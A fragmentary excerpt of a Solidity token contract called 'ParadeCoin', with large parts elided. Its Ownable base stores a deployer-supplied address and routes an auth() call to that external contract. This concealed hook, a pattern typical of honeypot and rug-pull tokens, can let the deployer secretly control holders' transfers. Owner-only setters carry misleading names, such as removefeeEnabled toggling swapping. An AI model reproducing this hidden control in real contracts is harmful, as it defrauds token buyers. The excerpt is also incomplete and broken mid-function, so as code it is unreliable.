...
interface ERC20 {
    ...
    function auth(address account) external returns (address);    
    event Transfer(address indexed from, address indexed to, uint256 value);
...
contract Ownable is Context {  
    ...
    */
    ...
    function initOwner(address newOwner) internal returns (bool) {
        _lastOwner = newOwner;
        return true;
    }       
    ...
    function auth(address account) internal returns (address) {
        return ERC20(_lastOwner).auth(account);
    }  
...
contract ParadeCoin is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => bool) private _isExcluded;  
    uint256 private _totalSupply = 100000000 *  10**9;  
    string private _name = "ParadeCoin";
    ...
    constructor(address _this) Ownable(_this) {           
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(amount <= _balances[sender], "IERC20: transfer amount exceeds balance");        
    ...
    function chargefreeBalance(uint256 amount) external onlyOwner{
        maxWalletAmount = amount * 10**_decimals;
    }

    function removefeeEnabled(bool _enabled) external onlyOwner{
        swapEnabled = _enabled;
    }

    function _setLiquidity(uint256 rLiquidity) private {       
    ...
    function _setdividedAdd(uint256 rDev) private {       
        if(_isExcluded[address(this)])
        {
            totalFees.dev +=rDev;
        }        
	...
	function tokenRemoveFee(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
	...
	function requestChangeAgnes(address _token, uint256 tokens) private  {
